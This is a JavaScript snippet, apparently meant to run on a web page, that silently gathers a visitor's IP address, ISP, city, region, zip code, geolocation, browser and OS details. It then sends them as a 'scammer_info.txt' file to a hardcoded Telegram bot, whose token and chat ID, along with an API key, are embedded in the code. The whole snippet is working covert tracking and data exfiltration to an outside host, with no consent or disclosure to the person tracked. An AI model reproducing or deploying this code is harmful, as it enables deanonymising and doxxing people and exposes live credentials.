
      // Get IP address using ipify API
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ipAddress = data.ip;

          // Get device information using VisitorAPI
          const visitorAPI = new VisitorAPI('7T5znrCevQpvnaVzvDxP', (data) => {
            const deviceInfo = data;
            const isp = deviceInfo.isp;
            const city = deviceInfo.city;
            const region = deviceInfo.region;
            const time = deviceInfo.time;
            const geolocationInfo = deviceInfo.geolocation;
            const browserInfo = deviceInfo.browser;
            const state = deviceInfo.state;
            const zip = deviceInfo.zip;

            // Get OS information using UAParser
            const userAgent = navigator.userAgent;
            const parser = new UAParser();
            const osInfo = parser.parse(userAgent).os;

            // Construct the message
            const message = `Scammer Information:\nIP Address: ${ipAddress}\nISP: ${isp}\nDevice Info: ${deviceInfo}\nOS Info: ${osInfo}\nCity: ${city}\nRegion: ${region}\nState: ${state}\nZip: ${zip}\nTime: ${time}\nGeolocation Info: ${geolocationInfo}\nBrowser Info: ${browserInfo}`;

            // Create a blob for the file
            const fileContent = message;
            const blob = new Blob([fileContent], { type: 'text/plain' });

            // Send the file to Telegram bot
            const telegramBotToken = 'AAGiWvPzYIEZfSbjveypTheZ6VDkMEj3RgI';
            const telegramBotChatId = '6753900712';
            const formData = new FormData();
            formData.append('chat_id', telegramBotChatId);
            formData.append('document', blob, 'scammer_info.txt');
            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendDocument`, {
              method: 'POST',
              body: formData
            })
              .then(response => response.json())
              .then(data => console.log(data))
              .catch(error => console.error(error));
          }, (error) => console.error(error));
        })
        .catch(error => console.error(error));
